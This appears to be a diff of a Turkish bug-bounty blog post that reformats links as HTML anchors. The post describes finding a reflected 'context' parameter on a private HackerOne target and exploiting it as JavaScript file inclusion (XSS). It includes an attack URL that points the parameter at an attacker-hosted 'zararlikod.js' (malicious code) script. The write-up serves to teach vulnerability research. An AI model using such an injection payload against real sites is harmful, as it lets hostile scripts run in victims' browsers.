@@ -18,7 +18,7 @@ excerpt: 'Javascript File Inclusion (XSS) via a Simple Link Injection'
 
 Merhaba arkadaşlar, ben Samet ŞAHİN.
 
-HackerOne (https://hackerone.com/) üzerindeki bir gizli (private) programa **Recognize** yaparken HTTP servisini kullanan bir IP adresi buldum. Bulduğum IP adresine girince direkt olarak bir index sayfasına yönlendiriyordu. Bu index sayfasının kaynak kodlarını (CTRL-U) okurken GET yöntemiyle değer alan bir `<form>` etiketi gördüm ve içerdiği `<input>` etiketlerinden "context" parametresinden değer aldığını fark ettim.  
+HackerOne ( <a href="https://hackerone.com/">https://hackerone.com/</a> ) üzerindeki bir gizli (private) programa **Recognize** yaparken HTTP servisini kullanan bir IP adresi buldum. Bulduğum IP adresine girince direkt olarak bir index sayfasına yönlendiriyordu. Bu index sayfasının kaynak kodlarını (CTRL-U) okurken GET yöntemiyle değer alan bir `<form>` etiketi gördüm ve içerdiği `<input>` etiketlerinden "context" parametresinden değer aldığını fark ettim.  
 
 <img src="/images/LinkInjectionBlogPost.PNG">  
 
@@ -27,7 +27,7 @@ Sıradan bir XSS araştırmasında tüm girdilere (input) XSS saldırı kodları
 Yani buradan bir #bugbountytip çıkarak olursak : "Sitenin ne işe yaradığını sorgula ve nasıl bozarım diye düşün."
 
 Ufak bir trickten sonra açığımıza geri dönelim. Kaynak kodunu okumuş ve "context" isimli bir girdi etiketinin varlığını anlamıştık. Şimdi eğer daha önce çok eski sitelere **Recognize** veya **Hacking** uyguladıysanız sitenin gerçekten çalışıp çalışmadığını kontrol etmelisiniz. Hadi gelin kontrol edelim. Link'in sonunda `?context=sametsahin` yazıyorum ve kaynak koduna nerelere ve nasıl yansıdığını inceliyorum.
-> URL : https://127.0.0.1/blablabla/index.html?context=sametsahin  
+> URL : <a href="https://127.0.0.1/blablabla/index.html?context=sametsahin">https://127.0.0.1/blablabla/index.html?context=sametsahin</a>  
 
 <img src="/images/LinkInjectionBlogPost2.PNG">  
 
@@ -41,7 +41,7 @@ Yukarıdaki resimde HTML ve JavaScript için hayati önem arz eden `<script>` et
 > Eğer benden aldığı değeri direkt olarak `<script>` etiketinin içine yerleştiriyor ise ben bu değeri bir kontrolümdeki site adresiyle değiştirip o sitedeki /javascript.js dosyasının içeriğini zararlı kodlar (payload) ile doldurarak XSS açığına erişebilirim.
 
 Bu durumda XSS açığına sebep olan URL adresimiz şu şekilde gözükecektir.
-> URL : https://127.0.0.1/blablabla/index.html?context=https://sametsahin.net/zararlikod.js?  
+> URL : <a href="https://127.0.0.1/blablabla/index.html?context=https://sametsahin.net/zararlikod.js?">https://127.0.0.1/blablabla/index.html?context=https://sametsahin.net/zararlikod.js?</a>  
 
 <img src="/images/LinkInjectionBlogPost3.png">  
 
